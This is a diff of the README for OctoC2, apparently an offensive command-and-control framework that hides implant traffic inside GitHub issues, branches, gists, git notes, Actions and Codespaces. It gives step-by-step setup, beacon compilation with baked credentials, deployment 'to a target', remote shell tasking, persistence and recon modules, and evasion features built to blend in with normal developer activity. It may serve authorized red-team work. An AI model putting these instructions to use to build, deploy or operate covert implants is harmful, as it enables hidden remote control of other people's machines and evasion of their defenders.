@@ -15,9 +15,7 @@
 
 <p align="center">
   <img src="https://img.shields.io/badge/version-v1.0.0-cyan" alt="v1.0.0"/>
-  <img src="https://img.shields.io/badge/tests-1%2C008%20passing-brightgreen" alt="1,008 tests"/>
   <img src="https://img.shields.io/badge/tentacles-11%20live-blue" alt="11 tentacles"/>
-  <img src="https://img.shields.io/badge/E2E-59%2F59-brightgreen" alt="E2E 59/59"/>
   <img src="https://img.shields.io/badge/license-MIT-blue" alt="MIT License"/>
 </p>
 
@@ -36,30 +34,31 @@
 
 ### Why OctoC2?
 
-- **Zero infrastructure** - No servers, no domains, no open ports.
-- **Excellent OPSEC** - Traffic looks like normal developer or automation activity on GitHub.
-- **Highly resilient** - 11 covert channels with configurable priority and automatic fallback.
-- **Strong encryption** - End-to-end with `libsodium crypto_box_seal` (X25519 + XSalsa20-Poly1305). Operator private key never leaves your machine.
-- **Production-ready** - Supports short-lived GitHub App installation tokens and encrypted runtime key delivery.
+- **Zero infrastructure** — No servers, no domains, no open ports
+- **Excellent OPSEC** — Traffic looks like normal developer or CI/CD activity on GitHub
+- **Highly resilient** — 11 covert channels with configurable priority and automatic fallback
+- **Strong encryption** — End-to-end with libsodium `crypto_box` (X25519 + XSalsa20-Poly1305)
+- **Production-ready** — GitHub App auth with rotating 1-hour tokens, encrypted runtime key delivery
+- **One-command setup** — Interactive wizard handles keygen, repo validation, config, and beacon build
 
 ---
 
 ## How it works
 
-Every operator command and beacon response travels through GitHub's own API surface. From a network perspective your beacon is a Bun process making authenticated HTTPS requests to `api.github.com`. No anomalous outbound connections, no self-signed certs, no beaconing to an IP you own.
+Every operator command and beacon response travels through GitHub's own API surface. From a network perspective, the beacon is a Bun process making authenticated HTTPS requests to `api.github.com`. No anomalous outbound connections, no self-signed certs, no beaconing to an IP you own.
 
-The beacon picks a channel from a configurable priority list and falls back automatically if a channel goes dark. All payloads use libsodium `crypto_box_seal` (X25519 + XSalsa20-Poly1305). The operator private key never touches the server or the beacon binary.
+The beacon picks a channel from a configurable priority list and falls back automatically if a channel goes dark. All payloads are encrypted with libsodium `crypto_box` / `crypto_box_seal`. The operator private key never touches the server or the beacon binary.
 
-For production engagements, swap PATs for GitHub App auth: installation tokens expire hourly and are scoped to a single repository. A captured token is useless within the hour. The App private key is delivered to running beacons at runtime via an encrypted dead-drop, so nothing sensitive is baked into the binary.
+For production engagements, swap PATs for GitHub App auth: installation tokens expire hourly and are scoped to a single repository. The App private key is delivered to running beacons at runtime via an encrypted dead-drop — nothing sensitive is baked into the binary.
 
 ### Components
 
 | Component   | Path                | Role |
 |-------------|---------------------|------|
-| Implant     | `implant/`          | Bun/TS beacon, 11 channels, automatic fallback |
-| Server      | `server/`           | Task queue, SSE stream, gRPC endpoint |
-| Dashboard   | `dashboard/`        | Operator UI: real-time feed, bulk actions, decrypt panel |
-| CLI         | `octoctl/`          | Setup wizard, beacon compiler, task queue, bulk shell, results decrypt |
+| Implant     | `implant/`          | Bun/TS beacon — 11 channels, automatic fallback, `--smol` memory mode |
+| Server      | `server/`           | Task queue, beacon registry, SSE stream, gRPC endpoint |
+| Dashboard   | `dashboard/`        | Operator UI — real-time beacon feed, task queue, result decryption |
+| CLI         | `octoctl/`          | Setup wizard, service manager, beacon compiler, task queue, shell, results |
 | OctoProxy   | `templates/proxy/`  | Relay through decoy repos via GitHub Actions |
 | Modules     | `modules/`          | Loadable post-ex scripts: recon, screenshot, persist |
 
@@ -71,7 +70,7 @@ For production engagements, swap PATs for GitHub App auth: installation tokens e
 |----|--------------------------|------------------------|-------------|
 | T1 | Issues + Comments        | Issues API             | Payload in HTML comment; issue title contains no C2 identifiers |
 | T2 | Branch + Files           | Git refs               | Branch named `infra-sync-{id8}`; task in `task.json`, ACK in `ack.json` |
-| T3 | Actions Workflows        | `repository_dispatch`  | Event type `ci-update`; variables use `INFRA_*` prefix |
+| T3 | Actions Variables        | Variables API          | `INFRA_*` prefix; works from any environment with a PAT |
 | T4 | Codespaces gRPC          | gRPC over SSH          | Tunnel through Codespace SSH; no external infrastructure |
 | T5 | Pages + Webhooks         | Deployments API        | Deploy environment named `ci-{id8}` |
 | T6 | Gists                    | Gists API              | Secret gist; filenames `svc-*.json` |
@@ -81,7 +80,7 @@ For production engagements, swap PATs for GitHub App auth: installation tokens e
 | T10| OctoProxy                | Decoy repos            | All traffic relayed through a separate repo you control |
 | T11| HTTP / WebSocket         | WebSocket + REST       | HTTPS to Codespace Dev Tunnel port; falls back to REST polling |
 
-Channel selection is runtime-configurable via `OCTOC2_TENTACLE_PRIORITY`. The E2E suite verifies zero forbidden terms in issue titles, branch names, commit messages, and API payloads.
+Channel selection is configurable at build time via `--tentacle-priority`. The beacon automatically falls back through the priority list if a channel becomes unavailable.
 
 ---
 
@@ -90,91 +89,141 @@ Channel selection is runtime-configurable via `OCTOC2_TENTACLE_PRIORITY`. The E2
 **Requirements:** [Bun](https://bun.sh) >= 1.3, a private GitHub repo, a PAT with `repo` scope
 
 ```bash
+# Install Bun (if needed)
+curl -fsSL https://bun.sh/install | bash
+
+# Clone and install
 git clone https://github.com/dstours/OctoC2.git
 cd OctoC2 && bun install
-```
 
-### Option A: Interactive setup wizard (recommended)
-
-The wizard walks you through keygen, repo validation, auth mode, channel selection, `.env` generation, and beacon compilation in one command:
-
-```bash
+# Run the setup wizard
 cd octoctl && bun run src/index.ts setup
 ```
 
-### Option B: Manual setup
+The wizard walks you through:
+1. GitHub credentials + repo validation
+2. Operator keypair generation
+3. Authentication mode (PAT or GitHub App)
+4. Covert channel selection
+5. Advanced config (proxy repos, Codespace gRPC, sleep tuning)
+6. `.env` file generation
+7. Beacon compilation
+8. Dead-drop creation (App auth)
+9. CLI installation to PATH
+
+After setup:
+
+```bash
+# Start the C2 server + dashboard
+octoctl start
+
+# Check status
+octoctl status
+
+# List beacons (after deploying the beacon to a target)
+octoctl beacons
+
+# Queue a task
+octoctl task <beaconId> --kind shell --cmd "whoami && id"
+
+# View results
+octoctl results <beaconId> --last 5
+
+# Interactive shell
+octoctl beacon shell --beacon <beaconId>
+
+# Open the dashboard
+# http://localhost:3000
+
+# Stop everything
+octoctl stop
+
+# Pull updates
+octoctl update
+```
+
+### Manual setup (alternative)
+
+If you prefer to configure manually instead of using the wizard:
 
 1. Generate an operator keypair
 ```bash
-cd octoctl
-bun run src/index.ts keygen --set-variable
-# Prints OCTOC2_OPERATOR_SECRET and pushes MONITORING_PUBKEY to repo
+bun run octoctl/src/index.ts keygen --set-variable
 ```
 
-2. Export environment
+2. Create a `.env` file at the project root
 ```bash
-export OCTOC2_GITHUB_TOKEN=<PAT>
-export OCTOC2_REPO_OWNER=<owner>
-export OCTOC2_REPO_NAME=<repo>
-export OCTOC2_OPERATOR_SECRET=<base64url-secret>
+OCTOC2_GITHUB_TOKEN=<PAT>
+OCTOC2_REPO_OWNER=<owner>
+OCTOC2_REPO_NAME=<repo>
+OCTOC2_OPERATOR_SECRET=<base64url-secret-from-keygen>
 ```
 
-3. Start the C2 server
+3. Start and build
 ```bash
-cd server && bun run src/index.ts
+octoctl start
+bun run octoctl/src/index.ts build-beacon --outfile ./beacon --target bun-linux-x64
 ```
 
-4. Build and deploy a beacon
+### Build examples
+
 ```bash
-cd octoctl
+# Actions channel primary, Issues fallback
+octoctl build-beacon --outfile ./beacon --tentacle-priority actions,issues
 
-# Compile a standalone binary with baked credentials
-bun run src/index.ts build-beacon --outfile ./beacon --target bun-linux-x64
-
-# Actions-only beacon (for CI/CD environments)
-bun run src/index.ts build-beacon --outfile ./beacon --tentacle-priority actions
+# Notes channel (max stealth), Issues fallback
+octoctl build-beacon --outfile ./beacon --tentacle-priority notes,issues
 
 # With GitHub App auth (recommended for production)
-bun run src/index.ts build-beacon --outfile ./beacon \
+octoctl build-beacon --outfile ./beacon \
   --app-id <id> --installation-id <id>
-# Then deliver the private key via dead-drop after first checkin:
-# bun run src/index.ts drop create --beacon <id> --app-key-file <pem>
-```
-Deploy the binary to target and execute. It registers via the configured channel on first check-in.
+# Then deliver the private key via dead-drop:
+octoctl drop create --beacon <id> --app-key-file <pem>
 
-5. Task and collect
-```bash
-cd octoctl
-
-bun run src/index.ts task <beaconId> --kind shell --cmd "id"
-bun run src/index.ts results <beaconId> --last 5
+# Codespaces gRPC with HTTP fallback
+octoctl build-beacon --outfile ./beacon \
+  --codespace-name <name> --github-user <user> \
+  --tentacle-priority codespaces,http,issues
 ```
 
-6. Open the operator dashboard (optional)
-```bash
-cd dashboard && bun run dev   # http://localhost:5173
+---
+
+## CLI reference
+
+```
+octoctl setup                          Interactive setup wizard
+octoctl start [server|dashboard]       Start C2 server and/or dashboard
+octoctl stop  [server|dashboard]       Stop running components
+octoctl status                         Show running components + health
+octoctl update                         Pull latest code + reinstall deps
+
+octoctl build-beacon --outfile <path>  Compile beacon with baked credentials
+octoctl beacons                        List registered beacons
+octoctl task <id> --kind <kind>        Queue a task for a beacon
+octoctl results <id>                   View decrypted task results
+octoctl beacon shell --beacon <id>     Interactive shell session
+
+octoctl keygen [--set-variable]        Generate operator X25519 keypair
+octoctl drop create --beacon <id>      Create encrypted dead-drop gist
+octoctl drop list --beacon <id>        Search for existing dead-drops
+octoctl proxy create                   Set up OctoProxy relay repo
+octoctl tentacles list --beacon <id>   Show tentacle channel status
 ```
 
-Channel selection examples:
-```bash
-# git notes primary, gist fallback, issues last resort
-octoctl build-beacon --outfile ./beacon --tentacle-priority notes,gist,issues
-
-# Actions-only (CI/CD)
-octoctl build-beacon --outfile ./beacon --tentacle-priority actions
-```
-See the full docs for OctoProxy setup, bulk shell, OpenHulud key delivery, capability modules, and the E2E test suite.
+---
 
 ## Testing
-```bash
-make test   # implant + server + octoctl + dashboard (1,008 tests)
 
-# E2E requires: OCTOC2_GITHUB_TOKEN, OCTOC2_REPO_OWNER, OCTOC2_REPO_NAME, OCTOC2_OPERATOR_SECRET
+```bash
+make test   # implant + server + octoctl + dashboard
+
+# E2E (requires env vars from .env)
 bun scripts/test-end-to-end.ts --cleanup
 bun scripts/test-end-to-end.ts --notes --gist --branch --secrets --actions --maintenance --cleanup
 ```
 
 ## Documentation
+
 Full documentation at https://dstours.github.io/OctoC2/
 
 ---
